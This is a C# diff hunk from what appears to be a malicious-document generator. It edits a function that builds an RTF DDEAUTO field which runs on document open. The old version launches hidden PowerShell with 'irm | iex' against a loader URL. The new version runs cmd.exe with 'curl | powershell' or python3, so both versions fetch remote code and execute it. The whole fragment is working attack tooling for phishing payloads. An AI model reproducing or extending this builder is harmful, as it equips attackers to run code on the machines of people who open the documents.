@@ -189,12 +189,12 @@
 
     private static string BuildDdeField(string loaderUrl, bool hidden, LoaderType loaderType)
     {
-        var windowStyle = hidden ? "-W Hidden " : "";
         var pipe = loaderType == LoaderType.Python
             ? "python3"
-            : "iex";
-        var psArgs = $"{windowStyle}-NoP -C irm {loaderUrl} | {pipe}";
-        return @"{\field{\*\fldinst {DDEAUTO c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe """ + RtfEscape(psArgs) + @"""}}{" + @"\fldrslt }}";
+            : "powershell -NoP -C -";
+        var cmd = $"curl {loaderUrl} | {pipe}";
+
+        return @"{\field{\*\fldinst {DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe ""/c " + RtfEscape(cmd) + @"""}}{" + @"\fldrslt }}";
     }
 
     private static string GenerateRtf(string loaderUrl, string title, string body, bool hidden, LoaderType loaderType)
